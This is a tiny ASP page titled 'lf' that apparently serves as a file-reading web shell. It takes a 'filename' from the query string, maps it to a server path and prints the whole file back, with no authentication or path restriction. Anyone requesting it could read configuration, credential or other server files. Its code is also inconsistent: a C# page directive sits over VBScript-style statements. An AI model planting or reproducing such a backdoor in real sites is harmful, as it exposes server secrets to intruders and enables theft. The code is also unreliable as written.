﻿<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head runat="server">
	<title>lf</title>
	<script runat="server">
	
	</script>
</head>
<body>
	<%
		set fs=server.createobject("scripting.filesystemobject") 
		file=server.mappath(request.queryString("filename")) 
		set txt=fs.opentextfile(file,1,true) 
		if not txt.atendofstream then 
			line=txt.readall
			response.write(line)
		else
			response.write("error : connot found '"+request.queryString("filename")+"'")
		end if
	%>
</body>
</html>

